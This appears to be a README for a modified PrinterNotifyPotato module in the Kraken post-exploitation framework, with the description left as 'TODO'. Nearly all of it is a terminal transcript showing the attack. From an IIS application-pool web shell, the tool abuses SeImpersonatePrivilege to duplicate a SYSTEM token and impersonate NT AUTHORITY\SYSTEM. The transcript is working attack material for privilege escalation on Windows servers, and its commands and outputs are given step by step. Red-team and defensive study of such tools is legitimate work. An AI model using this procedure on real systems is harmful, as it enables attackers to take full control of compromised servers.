# PrinterNotifyPotato mod

TODO

## Examples

An example of elevation of privilege + impersonation using Kraken:

```
(ST) IIS APPPOOL\DefaultAppPool@SRV1:C:/inetpub/wwwroot$ whoami
  USERNAME                    SID
    
  IIS APPPOOL\DefaultAppPool  S-1-5-82-3006700770-424185619-1745488364-794895919-4004696415  

(ST) IIS APPPOOL\DefaultAppPool@SRV1:C:/inetpub/wwwroot$ list_tokens                
          
  TOKEN  USERNAME                    NETWORK ACCESS  INTEGRITYLEVEL  
    
  648    nt authority\iusr           True            HIGH            
  836    iis apppool\defaultapppool  True            HIGH            

(ST) IIS APPPOOL\DefaultAppPool@SRV1:C:/inetpub/wwwroot$ execute_assembly -f /home/secu/net_assemblies/bin/PrinterNotifyPotato/PrinterNotifyPotato_net40_x64.exe -n PrintNotif -c Program -m Main
[+] Current user: 'IIS APPPOOL\DefaultAppPool'
[+] SeImpersonatePrivilege enabled
[+] Impersonating...
[+] Duplicated SYSTEM Token: '2492'

(ST) IIS APPPOOL\DefaultAppPool@SRV1:C:/inetpub/wwwroot$ list_tokens                
          
  TOKEN  USERNAME                    NETWORK ACCESS  INTEGRITYLEVEL  
    
  648    nt authority\iusr           True            HIGH            
  836    iis apppool\defaultapppool  True            HIGH            
  2492   nt authority\system         False           SYSTEM          

(ST) IIS APPPOOL\DefaultAppPool@SRV1:C:/inetpub/wwwroot$ set_token 2492             
Impersonated user: 'NT AUTHORITY\SYSTEM' with token: '2492'

(ST) NT AUTHORITY\SYSTEM@SRV1:C:/inetpub/wwwroot$ whoami      
      
  USERNAME             SID       
    
  NT AUTHORITY\SYSTEM  S-1-5-18  

(ST) NT AUTHORITY\SYSTEM@SRV1:C:/inetpub/wwwroot$ rev2self    
[*] Token 2492 has been dereferenced (this does not mean that the token has been released)

(ST) IIS APPPOOL\DefaultAppPool@SRV1:C:/inetpub/wwwroot$ exit
```


[1]: https://github.com/zcgonvh/DCOMPotato "PrinterNotifyPotato Repository"
